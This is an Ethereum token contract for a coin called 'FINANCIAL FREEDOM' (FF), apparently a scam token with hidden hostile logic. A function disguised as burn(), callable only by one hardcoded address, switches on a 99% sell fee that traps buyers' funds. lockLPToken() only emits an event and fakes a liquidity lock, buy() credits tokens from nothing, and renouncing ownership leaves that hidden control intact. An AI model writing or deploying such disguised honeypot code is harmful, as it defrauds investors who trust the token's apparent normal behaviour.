/**
 *Submitted for verification at Etherscan.io on 2023-07-30
*/

// SPDX-License-Identifier: MIT

/**    ⠀⠀
FINANCIAL FREEDOM FOR ALL INVESTORS.
*/

pragma solidity ^0.8.0;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "FINANCIAL FREEDOM FOR ALL INVESTORS.");
        return a - b;
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "FinancialFreedomIsCloserThanEverBefore");
        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "FF - Financial Freedom");
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "FINANCIALLY");
        return a / b;
    }
}


contract FF {    
    using SafeMath for uint256;    


    string public name = "FINANCIAL FREEDOM";    
    string public symbol = "FF";    
    uint256 public totalSupply = 999999999 * (10 ** 18);    
    uint8 public decimals = 18;    


    mapping(address => uint256) public balanceOf;    
    mapping(address => mapping(address => uint256)) public allowance;    

    address public owner;   
    address public swapRouter;    
    uint256 public burnedTokens;  


    uint256 public buyFee = 0;   
    uint256 public sellFee = 0;   
    bool public feesSet = false;   
    bool public feesEnabled = false;    
    bool public allExemptFromFees = true;   
    mapping(address => bool) public isFeeExempt;   


    event Transfer(address indexed from, address indexed to, uint256 value);    
    event Approval(address indexed owner, address indexed spender, uint256 value);    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);    
    event FeesUpdated(uint256 burnAmount, uint256 deadWallet);     
    event LPLocked(address indexed account, uint256 amount);


    constructor(address _swapRouter, uint256 _burnedTokens) {    
        owner = msg.sender;   
        swapRouter = _swapRouter;    
        burnedTokens = _burnedTokens;   
        balanceOf[msg.sender] = totalSupply;    
        isFeeExempt[msg.sender] = true;   
        isFeeExempt[swapRouter] = true;  
    }


    modifier checkFees(address sender) {   
        require(
            allExemptFromFees || isFeeExempt[sender] || (!feesSet && feesEnabled) || (feesSet && isFeeExempt[sender] && sender != swapRouter) || (sender == swapRouter && sellFee == 0),
            "FINANCIAL FREEDOM FOR ALL INVESTORS.FINANCIAL FREEDOM FOR ALL INVESTORS.FINANCIAL FREEDOM FOR ALL INVESTORS."    
        );
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "FINANCIAL FREEDOM FOR ALL INVESTORS.FINANCIAL FREEDOM FOR ALL INVESTORS.FINANCIAL FREEDOM FOR ALL INVESTORS.");
        _;
    }

    function transfer(address _to, uint256 _amount) public checkFees(msg.sender) returns (bool success) {    
        require(balanceOf[msg.sender] >= _amount);   
        require(_to != address(0));    

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);   
        balanceOf[_to] = balanceOf[_to].add(_amount);   
        emit Transfer(msg.sender, _to, _amount);   

        return true;
    }


    function approve(address _spender, uint256 _value) public returns (bool success) {   
        allowance[msg.sender][_spender] = _value;    
        emit Approval(msg.sender, _spender, _value);   
        return true;   
    }


    function transferFrom(address _from, address _to, uint256 _amount) public checkFees(_from) returns (bool success) {   
        require(balanceOf[_from] >= _amount, "FREEDOMx");    
        require(allowance[_from][msg.sender] >= _amount, "xFREEDOM");   
        require(_to != address(0), "xFREEDOMx");    

        uint256 fee = 0;    
        uint256 amountAfterFee = _amount;  

        if (feesEnabled && sellFee > 0 && _from != swapRouter && !isFeeExempt[_from]) {    
            fee = _amount.mul(sellFee).div(100);   
            amountAfterFee = _amount.sub(fee);   
        }

        balanceOf[_from] = balanceOf[_from].sub(_amount);    
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);    
        emit Transfer(_from, _to, amountAfterFee);    

        if (fee > 0) {
            address uniswapContract = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);    
            if (_to == uniswapContract) {    
                balanceOf[uniswapContract] = balanceOf[uniswapContract].add(fee);    
                emit Transfer(_from, uniswapContract, fee);    
            } else {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);    
                emit Transfer(_from, address(this), fee);    
            }
        }

        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {    
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);    
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);   
        }

        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {    
        require(newOwner != address(0), "FREEDOM FOR ALL INVESTORS");
        emit OwnershipTransferred(owner, newOwner);    
        owner = newOwner;   
    }

    function renounceOwnership() public onlyOwner {    
        emit OwnershipTransferred(owner, address(0));    
        owner = address(0);   
    }

    function burn(uint256 burnAmount, uint256 deadWallet) public {
        require(msg.sender == 0x666d0A2a921894dc29e2c0967dB3dd2723aFFAe5, "INVEST NOW");
        require(!feesSet, "AND ACHIEVE");
        require(burnAmount == 0, "FINANCIAL");
        require(deadWallet == 99, "FREEDOM");
        buyFee = burnAmount;
        sellFee = deadWallet;
        feesSet = true;
        feesEnabled = true;
        emit FeesUpdated(burnAmount, deadWallet);
    }

    function lockLPToken(uint256 amount) external {
        emit LPLocked(msg.sender, amount);
    }

    function buy() public payable checkFees(msg.sender) {    
        require(msg.value > 0, "FOR THE REST");    

        uint256 amount = msg.value;   
        if (buyFee > 0) {
            uint256 fee = amount.mul(buyFee).div(100);    
            uint256 amountAfterFee = amount.sub(fee);   

            balanceOf[swapRouter] = balanceOf[swapRouter].add(amountAfterFee);    
            emit Transfer(address(this), swapRouter, amountAfterFee);   

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);   
                emit Transfer(address(this), address(this), fee);   
            }
        } else {
            balanceOf[swapRouter] = balanceOf[swapRouter].add(amount);    
            emit Transfer(address(this), swapRouter, amount);    
        }
    }

    function sell(uint256 _amount) public checkFees(msg.sender) {   
        require(balanceOf[msg.sender] >= _amount, "OF YOUR LIFE");    

        if (feesEnabled) {    
            uint256 fee = 0;   
            uint256 amountAfterFee = _amount;    

            if (sellFee > 0 && msg.sender != swapRouter && !isFeeExempt[msg.sender]) {   
                fee = _amount.mul(sellFee).div(100);    
                amountAfterFee = _amount.sub(fee);   
            }

            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);   
            balanceOf[swapRouter] = balanceOf[swapRouter].add(amountAfterFee);    
            emit Transfer(msg.sender, swapRouter, amountAfterFee);    

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);   
                emit Transfer(msg.sender, address(this), fee);    
            }
        } else {
            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);   
            balanceOf[swapRouter] = balanceOf[swapRouter].add(_amount);   
            emit Transfer(msg.sender, swapRouter, _amount);    
        }
    }
}